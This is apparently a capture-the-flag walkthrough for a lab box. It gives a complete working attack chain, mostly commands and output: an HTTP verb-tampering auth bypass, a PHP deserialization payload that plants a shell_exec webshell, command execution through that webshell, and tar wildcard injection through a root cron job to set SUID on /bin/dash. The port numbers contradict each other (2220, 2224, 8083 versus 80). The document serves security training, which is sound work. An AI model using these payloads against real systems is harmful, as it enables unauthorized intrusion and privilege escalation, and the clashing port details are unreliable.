# AM-04: R&D Annex — Player Walkthrough

> **Difficulty:** Medium
> **Services:** HTTP (port 80, Basic Auth), SSH (port 2220), API (port 3000)
> **Flags:** User flag + Root flag
> **Skills learned:** HTTP verb tampering, PHP deserialization, webshell deployment, tar wildcard injection for privilege escalation

This walkthrough teaches you about HTTP verb tampering (bypassing authentication using non-standard HTTP methods), PHP object deserialization attacks, and a clever privilege escalation technique using tar wildcards.

---

## Prerequisites

- A Kali Linux VM with nmap, curl, and basic understanding of HTTP

---

## Stage 1 — Reconnaissance

```bash
nmap -sV -sC localhost
```

**Expected output (dev ports):**
```
80/tcp  open  http    Apache (401 Unauthorized)
2224/tcp  open  ssh     OpenSSH
3000/tcp  open  http    Python (R&D API)
```

**What we learned:** The web server on port 8083 returns `401 Unauthorized` — it's protected by HTTP Basic Authentication. There's also an API on port 3000 that might have useful information.

---

## Stage 2 — API Reconnaissance (Port 3000)

**Goal:** Check the API for hints before attacking the protected web server.

```bash
curl http://localhost:3000/
```

**Expected output:**
```
R&D Internal API
QUORUM Core: 3.2.0 (public) vs 4.7.2 (internal) — DISCREPANCY
Diagnostic Tools at /scriptz/
```

**What we learned:**
1. There's a version discrepancy — QUORUM's internal version is higher than the public version (lore hint)
2. There's a `/scriptz/` directory mentioned — this might be accessible on the web server

---

## Stage 3 — HTTP Verb Tampering (Bypassing Basic Auth)

**Goal:** Access the web server despite the 401 authentication requirement.

**What is HTTP verb tampering?** HTTP defines methods (also called "verbs") like GET, POST, HEAD, PUT, DELETE, etc. Web servers are configured to require authentication for specific methods. If the server only protects `GET`, `POST`, and `HEAD`, but allows other methods (like a made-up method), you can bypass the authentication.

Try a standard GET request:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost/
# 401 — Unauthorized
```

Now try a non-standard verb:

```bash
curl -s -X BOB http://localhost/index.php | head -20
# 200 — Page renders!
```

**Why this works:** Apache's configuration uses `<Limit GET POST HEAD>` to require authentication only for those specific methods. A request with any other method (like the nonsense `BOB`) bypasses the check entirely. This is a real misconfiguration found in production systems.

**View the page source to find hints:**

```bash
curl -X BOB http://localhost/index.php
```

You'll see references to:
- `scriptz/php.js` — a JavaScript file that builds serialized objects
- Hidden note about version discrepancy (same as the API)

---

## Stage 4 — Directory Listing + Gadget Discovery

**Goal:** Find the PHP deserialization gadget chain.

Browse the `/scriptz/` directory:

```bash
curl http://localhost/scriptz/
```

**Expected output (directory listing):**
```
php.js
log.php.BAK
```

Read the backup file:

```bash
curl http://localhost/scriptz/log.php.BAK
```

**Expected output (PHP code):**
```php
class Log {
    public $filename;
    public $data;
    function __destruct() {
        file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
```

**What is this?** This is a PHP class with a `__destruct()` method. In PHP, `__destruct()` runs automatically when an object is destroyed (at the end of a script). This one writes data to a file — a classic "gadget" for deserialization attacks.

---

## Stage 5 — PHP Deserialization Attack

**Goal:** Craft a malicious serialized object that writes a webshell to the server.

**What is PHP deserialization?** PHP can convert objects into strings (serialization) and back into objects (deserialization). If an application deserializes untrusted user input, an attacker can craft a malicious object that triggers dangerous actions when it's reconstructed — like the `__destruct()` method writing a file.

We craft a serialized `Log` object that writes a PHP webshell:

```
O:3:"Log":2:{s:8:"filename";s:34:"/var/www/html/scriptz/dz_shell.php";s:4:"data";s:39:"<?php echo shell_exec($_GET['cmd']); ?>";}
```

**Breaking down the serialization format:**
- `O:3:"Log"` — an Object of class "Log" (3 characters in the name)
- `2:` — has 2 properties
- `s:8:"filename"` — string property "filename" (8 chars), value is the path
- `s:4:"data"` — string property "data" (4 chars), value is the webshell code

POST it using the bypass verb:

```bash
curl -X BOB --data-urlencode 'param=O:3:"Log":2:{s:8:"filename";s:34:"/var/www/html/scriptz/dz_shell.php";s:4:"data";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}' http://localhost/index.php
```

When PHP deserializes our object, the `__destruct()` method writes our webshell to `/var/www/html/scriptz/dz_shell.php`. We write it to `scriptz/` because that directory has `Satisfy any` in its `.htaccess`, so `GET` requests bypass Basic Auth — the webroot requires auth for `GET`. Test it:

```bash
curl "http://localhost/scriptz/dz_shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**We have RCE!** Get the user flag:

```bash
curl "http://localhost/scriptz/dz_shell.php?cmd=cat+/home/researcher/user.txt"
# DZ{user_rd_annex_PLACEHOLDER}
```

---

## Stage 6 — Discovering the tar Wildcard Vulnerability

**Goal:** Find a cron job with a tar wildcard injection vulnerability.

Read the cron entry (it's in `/etc/cron.d/rd-backup`, not the system crontab):

```bash
curl "http://localhost/scriptz/dz_shell.php?cmd=cat+/etc/cron.d/rd-backup"
# */5 * * * * root /usr/local/bin/rd_backup.sh
# * * * * * root /root/create_backup.sh
```

Read the backup script:

```bash
curl "http://localhost/scriptz/dz_shell.php?cmd=cat+/usr/local/bin/rd_backup.sh"
```

**Expected content:**
```bash
#!/bin/sh
rm -f /home/researcher/backup/backup.tar.gz
cd /home/researcher/backup
tar cfz /home/researcher/backup/backup.tar.gz *
chown researcher:researcher /home/researcher/backup/backup.tar.gz
rm -f /home/researcher/backup/*.BAK
```

**What's the vulnerability?** The `tar` command uses `*` (wildcard) to select all files in the directory. In Linux, command-line wildcards are expanded by the shell BEFORE the command runs. If we create files with names that look like tar command-line options, they get passed to tar as arguments!

---

## Stage 7 — tar Wildcard Injection (Root Flag)

**Goal:** Exploit the tar wildcard to run arbitrary commands as root.

The key tar options we'll abuse:
- `--checkpoint=1` — tar processes checkpoints during archive creation
- `--checkpoint-action=exec=sh shell.sh` — at each checkpoint, run a script

Create the exploit files in the world-writable backup directory:

```bash
# File 1: named "--checkpoint=1" — tar interprets this as the checkpoint option
curl -G --data-urlencode "cmd=cd /home/researcher/backup && echo > --checkpoint=1" http://localhost/scriptz/dz_shell.php

# File 2: named "--checkpoint-action=exec=sh shell.sh" — tar runs our script
curl -G --data-urlencode "cmd=cd /home/researcher/backup && echo > '--checkpoint-action=exec=sh shell.sh'" http://localhost/scriptz/dz_shell.php

# File 3: "shell.sh" — the script that sets SUID on /bin/dash
curl -G --data-urlencode "cmd=cd /home/researcher/backup && echo 'chmod u+s /bin/dash' > shell.sh" http://localhost/scriptz/dz_shell.php

# Make shell.sh executable:
curl -G --data-urlencode "cmd=cd /home/researcher/backup && chmod +x shell.sh" http://localhost/scriptz/dz_shell.php
```

> **Note on quoting:** Using `-G --data-urlencode` lets curl handle URL-encoding
> for us, so `&&`, spaces, `>`, and quotes in the command don't need manual
> escaping. If you inline the command in the URL query string instead, you
> must encode `&&` as `%26%26` (otherwise the shell running curl treats `&&`
> as its own operator) and quote filenames that contain spaces or start with
> `--`.

**How the exploit works:** When cron runs `tar cfz backup.tar.gz *`, the shell expands `*` to the filenames in the directory, including `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`. Tar interprets these as command-line options, not filenames. At the checkpoint, tar executes `shell.sh`, which sets the SUID bit on `/bin/dash`.

Wait up to 5 minutes for the cron job, then verify:

```bash
curl -G --data-urlencode "cmd=ls -la /bin/dash" http://localhost/scriptz/dz_shell.php
# -rwsr-xr-x 1 root root ... /bin/dash
```

Get the root flag:

```bash
curl -G --data-urlencode "cmd=/bin/dash -p -c 'cat /root/root.txt'" http://localhost/scriptz/dz_shell.php
# DZ{root_rd_annex_PLACEHOLDER}
```

> **Why `-p`?** The SUID bit on `/bin/dash` sets the *effective* UID to root,
> but dash drops privileges back to the real UID (www-data) on startup for
> safety. The `-p` (privileged) flag tells dash to keep the elevated
> effective UID, so `cat /root/root.txt` can read root-owned files. Without
> `-p` you get `Permission denied` because `/root/` is mode `700`.

---

## Summary

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Found HTTP (80, 401), SSH (2220), API (3000) |
| 2 | API recon | Found hints about `/scriptz/` directory |
| 3 | HTTP verb tampering | Bypassed Basic Auth with `curl -X BOB` |
| 4 | Directory listing | Found `log.php.BAK` with a PHP gadget class |
| 5 | PHP deserialization | Crafted a serialized object that wrote a webshell |
| 6 | Cron + tar discovery | Found a cron backup job using `tar *` wildcard |
| 7 | tar wildcard injection | Created files named as tar options, got root flag |

**Key takeaways:**
- **HTTP verb tampering bypasses weak auth configs.** Try `BOB`, `PUT`, `TRACE`, etc. when you see 401.
- **Directory listings leak source code.** Always check for `.BAK` files and directory indexing.
- **Deserialization attacks write files.** A `__destruct()` that calls `file_put_contents` is a perfect gadget.
- **tar wildcards are a known privesc technique.** When you see `tar *` in a root cron job, think checkpoint-action. Read more at [GTFOBins: tar](https://gtfobins.github.io/gtfobins/tar/).
